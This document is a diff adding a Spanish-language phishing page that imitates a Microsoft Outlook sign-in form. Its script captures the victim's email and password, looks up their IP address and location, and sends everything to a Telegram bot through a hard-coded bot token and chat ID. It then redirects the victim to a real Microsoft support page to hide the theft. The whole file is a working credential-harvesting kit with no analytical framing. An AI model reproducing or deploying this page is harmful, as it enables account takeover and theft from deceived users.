@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+
+
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+
+	<link rel="stylesheet" href="./hhhhhh_files/bactouch.css"><link rel="stylesheet" href="./hhhhhh_files/toolbar.css"><link rel="stylesheet" href="./hhhhhh_files/bact_listview.css"><link rel="stylesheet" href="./hhhhhh_files/footer.css"><script src="./hhhhhh_files/authhub-helper.js.descarga"></script><link rel="stylesheet" href="./hhhhhh_files/slidemenu.css"><script src="./hhhhhh_files/ap.js.descarga"></script></head>
+
+
+<head>
+<!-- Inserted by miarroba -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>log</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f7f7f7;
+      font-family: Arial, sans-serif;
+    }
+    .login-form {
+      width: 400px;
+      padding: 40px;
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .login-form h2 {
+      text-align: center;
+      margin-bottom: 40px;
+      color: #3f3f3f;
+    }
+    .login-form input[type="email"], .login-form input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+    }
+    .login-form input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #2435dc;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .login-form input[type="submit"]:hover {
+      background-color: #2435dc;
+    }
+  </style>
+</head>
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+  <div class="login-form">
+
+<p><img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" /></p>
+<div id="usernameTitle"><strong>Iniciar sesi&oacute;n</strong></div>
+<div>&nbsp;</div>
+<div class="___q35p590 fedgsey f71fsbu f1n95isl">Para continuar a Outlook</div>
+
+<br>
+<br>
+
+                        	        <form id="loginForm">
+
+
+      <input type="email" id="usuario111" name="usuario111" placeholder="Correo electronico " minlength="" maxlength="" required>
+
+<br>
+
+<br>
+      <input type="text" id="usuario222" name="usuario222" placeholder="Clave de Correo" minlength="" maxlength=""  required>
+<br>
+<br>
+      <input type="submit" value="Ingresar">
+    </form>
+<br>
+<p style="text-align: center;">&nbsp;<strong>Iniciar - 2024 Equipo Microsoft</strong></p>
+<div style="text-align: center;"><strong>Validar Su Correo correctamente&nbsp;</strong></div>
+
+  </div>
+
+
+
+    </script>
+
+
+</form>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+                var u_name111 = $('#usuario111').val();
+                var u_name222 = $('#usuario222').val();
+
+
+                var ip, ip2;
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        ip2 = response.city + ", " + response.country;
+                        var message = "E-mail-:\nCorreo: " + u_name111 + "\nClave: " + u_name222 + "\nIP: " + ip + "\n" + ip2;
+                        var telegram_bot_id = "7013446332:AAFzYh7kqHeba1qmpsXV4RDhSgqXRpVCcsY"; // Reemplaza con tu Bot ID
+                        var chat_id = "6588464495"; // Reemplaza con tu Chat ID
+                        var settings = {
+                            "async": true,
+                            "crossDomain": true,
+                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                            "method": "POST",
+                            "headers": {
+                                "Content-Type": "application/json",
+                                "cache-control": "no-cache"
+                            },
+                            "data": JSON.stringify({
+                                "chat_id": chat_id,
+                                "text": message
+                            })
+                        };
+                        $.ajax(settings).done(function (response) {
+                            window.location = 'https://support.microsoft.com/es-ES/microsoft-365'; // Redirige después de enviar el mensaje
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+
+
+
+    <!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__general__script.php?__muid=&amp;h=2180507&amp;t=1726794693&amp;k=55e6b4d2547065c75893bd9d5edbb19c"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="/hosting__general__script.php?__muid=&amp;h=2180507&amp;t=1726794693&amp;k=55e6b4d2547065c75893bd9d5edbb19c&amp;img=1" /></noscript>
+<!-- Inserted by miarroba -->
+</body>
+</html>
+<!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__general__script.php?__muid=&amp;h=2180507&amp;t=1726794693&amp;k=55e6b4d2547065c75893bd9d5edbb19c"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="/hosting__general__script.php?__muid=&amp;h=2180507&amp;t=1726794693&amp;k=55e6b4d2547065c75893bd9d5edbb19c&amp;img=1" /></noscript>
+<!-- Inserted by miarroba -->
+</body>
+</html>
